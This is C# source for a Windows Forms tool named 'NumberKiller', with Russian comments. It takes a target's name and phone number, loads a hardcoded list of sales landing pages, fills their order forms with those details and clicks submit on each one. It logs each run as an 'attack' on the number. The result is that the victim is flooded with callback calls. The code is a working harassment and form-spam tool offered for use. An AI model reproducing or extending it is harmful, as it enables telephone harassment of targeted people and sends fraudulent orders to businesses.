using System;
using System.Collections.Generic;
using System.Net;
using System.Windows.Forms;
using System.IO;

namespace NumberKiller
{

    public partial class app_UI : Form
    {
        // БЛОК ИНИЦИЛИЗАЦИИ
        /******************************************************************************************************************************************/
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [System.Runtime.InteropServices.DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [System.Runtime.InteropServices.DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        // Объявляем экземпляр класса потока записи в файл 
        private StreamWriter file;

        // Обьявляем экзмпляры классов для работы с информацей о страницах 
        private Uri urlCheck;
        private HttpWebRequest request;
        private HttpWebResponse response;

        // Переменные для хранения значений из полей ввода 
        private String phone;
        private String name;

        // Поля - счетчики
        private int page_number;
        private int count_of_pages ;

        // Объявляем листы для хранения значений полей HTML кода для ввода имени,
        // Номера телефона и кнопки "подтвердить" 
        private List<String> URLs = new List<String>();
        private List<String> name_field = new List<String>();
        private List<String> phone_field = new List<String>();
        private List<String> button = new List<String>();

        // Иницилизация приложения и полей во время запуска
        public app_UI()
        {
            InitializeComponent();

            // Добаление сайтов из базы в память программы
            URLs.Add("http://eco-gribs.ru/");
            URLs.Add("http://lexopol-low.dostavka2.me/");
            URLs.Add("http://c.potencialex.ru/149/v1/");
            URLs.Add("http://titan-gel.com");
            URLs.Add("http://imira.a47m.biz/");
            URLs.Add("http://hq.shopent.net/");
            URLs.Add("http://kvlow.meta-complex.com/");

            // Иницилизация списка атрибутов для ввода имени в текстовое поле
            name_field.Add("name");
            name_field.Add("fio");
            name_field.Add("order[fio]");
            name_field.Add("FormLanding[fio]");

            // Иницилизация списка атрибутов для ввода номера телефона в текстовое поле
            phone_field.Add("FormLanding[phone]");
            phone_field.Add("phone");
            phone_field.Add("order[phone]");
            phone_field.Add("FormLanding[phone]");

            // Объявление списка атрибутов для нажатия кнопки
            button.Add("input");
            button.Add("button order-btn ifr_button");

            progress_bar.Maximum = URLs.Count;
        }

        // БЛОК ОБРАБОТКИ ФОРМЫ
/******************************************************************************************************************************************/

        // Обработчик нажатия на кнопку старт
        private void start_button_Click(object sender, EventArgs e)
        {
            // Сброс номера страницы
            page_number = 0;

            // Иницилизация количества сайтов
            count_of_pages = URLs.Count;

            // Получаем значения из полей ввода и записываем в переменные          
            name = name_textbox.Text;

            // Удаляем лишние символы из строки с телефоном
            phone = phone_textbox.Text.Trim(new char[] {' ', '*', '-', '(', ')' });          

            // Смотрим на наличие введенного имени и телефона в поля
            if ((name_textbox.Text == "") && (phone_textbox.Text == ""))
            {
                name_field_label.Visible = true;
                phone_field_label.Visible = true;
                return;
            }

            // Смотрим на наличие введенного имени в поле
            else if (name_textbox.Text == "")
            {
                name_field_label.Visible = true;

                // Пишем для того чтобы преждевеременно выйти из функции
                return;
            }

            // Смотрим на наличие введенного номера телефона в поле
            else if (phone_textbox.Text == "")
            {
                phone_field_label.Visible = true;

                // Пишем для того чтобы преждевеременно выйти из функции
                return;
            }

            // Если все введено производим запуск вызывая метод смены страницы
            else
            {
                // Логируем информацию о жертве
                LogSystem(2);
                start_button.Enabled = false;
                ChangePage(page_number);
            }
        }

        // Убираем сообщение о том что не введено имя когда нажимаем на поле
        private void name_textbox_MouseClick(object sender, MouseEventArgs e)
        {
            name_field_label.Visible = false;
        }

        // Убираем сообщение о том что не введен номер телефона когда нажимаем на поле
        private void phone_textbox_MouseClick(object sender, MouseEventArgs e)
        {
            phone_field_label.Visible = false;
        }

        // Обработка кнопки "отчет"
        private void log_button_Click(object sender, EventArgs e)
        {
            // Открываем текстовый файл в блокноте
            System.Diagnostics.Process.Start(@"C:\Users\User\Desktop\logs.txt");
        }

        // Обработка кнопки выхода 
        private void exit_button_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        // Обработка перемещения окна
        private void app_UI_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        // БЛОК ВНУТРЕННЕЙ ЛОГИКИ
        /******************************************************************************************************************************************/

        // Метод смены страницы
        private void ChangePage(int page)
        {
            LogSystem(0);
            progress_bar.Value = page + 1;

            // Блок проверки валидности страницы
            urlCheck = new Uri(URLs[page]);

            // Создаем запрос по URL сайта
            request = (HttpWebRequest)WebRequest.Create(urlCheck);
            request.Timeout = 1000;

            // Отвлавливание исключения 
            try
            {
                // Получаем ответ сайта
                response = (HttpWebResponse)request.GetResponse();
                webBrowser.Navigate(URLs[page]);
            }

            // Вызывается если ответ не был получен
            catch (Exception)
            {
                // Вызываем лог-систему и присваеваем ей код исключения (404 - страница не найдена)
                LogSystem(404);
                count_of_pages--;
                page_number++;
                ChangePage(page_number);
            }       
        }

        // Метод отвечающий за прогрузку веб-страницы до конца
        private void webBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            try
            {
                if (count_of_pages > 0)
                {
                    LogSystem(1);
                    count_of_pages--;
                    page_number++;              
                    Auto_fill();
                }
            }
            catch (NullReferenceException)
            {

            }
        }

        // Метод автозаполнения полей и нажатия на кнопки на сайтах
        private void Auto_fill()
        {
            // Перебор страницы и поиск поля ввода имени 
            // Если найденый атрибут NAME у тега INPUT совпадает с одним из элементом в списке возможных вариантов
            // То заполняем поле в форме нашей переменной 
            foreach (HtmlElement htmlElement in webBrowser.Document.GetElementsByTagName("input"))
                foreach (String nameElement in name_field)
                    if (htmlElement.GetAttribute("name").Equals(nameElement))
                        htmlElement.InnerText = name;

            foreach (HtmlElement htmlElement in webBrowser.Document.GetElementsByTagName("input"))
                foreach (String phoneElement in phone_field)
                    if (htmlElement.GetAttribute("name").Equals(phoneElement))
                        htmlElement.InnerText = phone;

            foreach (HtmlElement htmlElement in webBrowser.Document.GetElementsByTagName("input"))
                foreach (String buttonElement in button)
                    if (htmlElement.GetAttribute("type").Equals(buttonElement))
                        htmlElement.InvokeMember("click"); // Производим виртуальное нажатие кнопки

            foreach (HtmlElement htmlElement in webBrowser.Document.GetElementsByTagName("button"))
                foreach (String buttonElement in button)
                    if (htmlElement.GetAttribute("type").Equals(buttonElement) || htmlElement.GetAttribute("class").Equals(buttonElement))                     
                        htmlElement.InvokeMember("click"); // Производим виртуальное нажатие кнопки
         
            // Логируем выполнение 
            LogSystem(-1);

            // Стоп сигнал если количество страниц будет равно нулю
            if (count_of_pages != 0)
                ChangePage(page_number);

            // Сброс полоски прогресса и включение кнопки
            else if (count_of_pages == 0)
            {
                start_button.Enabled = true;
                progress_bar.Value = 0;
                LogSystem(3);
            }
        }

        // Лог система в качестве вызываемого метода
        // В качестве аргумента принимает целочисленное знаничение - код статуса
        private void LogSystem(int status)
        {
            // Открываем поток для записи в файл
            // Первый аргумент - путь где будет создан/перезаписан файл
            // Второй - возможна ли перезапись файла
            file = new StreamWriter(@"C:\Users\User\Desktop\logs.txt", true);

            // Пишет перед каждой строчкой текущую дату и время
            file.Write(DateTime.Now.ToString("dd.MM.yyyy | HH:mm:ss "));

            
            switch (status) // Выборка по коду статуса и запись в файл информации
            {
                case -2:
                    file.Write("-Автор софта: github.com/acr0matic");
                    break;
                case -1:
                    file.Write("- Данные отправлены");
                    break;
                case 0:
                    file.Write("- Загрузка: " + URLs[page_number]);
                    break;
                case 1:
                    file.Write("- Успешно загружено");
                    break;
                case 2:
                    file.Write("- Атака на номер: " + phone + ", Имя: " + name);
                    break;               
                case 3:
                    file.Write("- Проход завершен успешно.");
                    break;
                case 200:
                    file.Write("- Поле для ввода имени не найдено");
                    break;
                case 205:
                    file.Write("- Поле для ввода телефона не найдено");
                    break;
                case 404:
                    file.Write("- Страница не найдена (404)");
                    break;
            }

            // Переносим строку
            file.Write("\n");

            // Закрываем поток записи в файл для того чтобы изменения были внесенны в файл
            file.Close();
        }    
    }
}
